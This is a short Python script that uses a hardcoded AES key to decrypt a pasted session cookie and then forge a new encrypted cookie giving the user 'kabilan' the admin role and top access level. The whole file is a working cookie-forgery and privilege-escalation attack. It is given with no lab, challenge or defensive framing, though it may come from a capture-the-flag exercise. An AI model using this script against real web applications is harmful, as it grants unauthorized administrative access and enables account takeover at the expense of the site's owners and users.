from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64, json, os

key = bytes.fromhex('4b1e9d2c6a7f0834c5e19a2b7d6f0e834b1e9d2c6a7f0834c5e19a2b7d6f0e83')

# 1. Decrypt existing cookie to confirm the key works
raw_cookie = "<paste your session cookie here>"
decoded = base64.b64decode(raw_cookie)
iv, ct = decoded[:16], decoded[16:]
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ct), 16)
print("Decrypted:", plaintext)

# 2. Forge admin cookie
payload = json.dumps({
    "user": "kabilan",
    "role": "admin",
    "expires": "2027-09-23",
    "access_level": 5
})
iv2 = os.urandom(16)
cipher2 = AES.new(key, AES.MODE_CBC, iv2)
ct2 = cipher2.encrypt(pad(payload.encode(), 16))
forged = base64.b64encode(iv2 + ct2).decode()
print("Forged cookie:", forged)
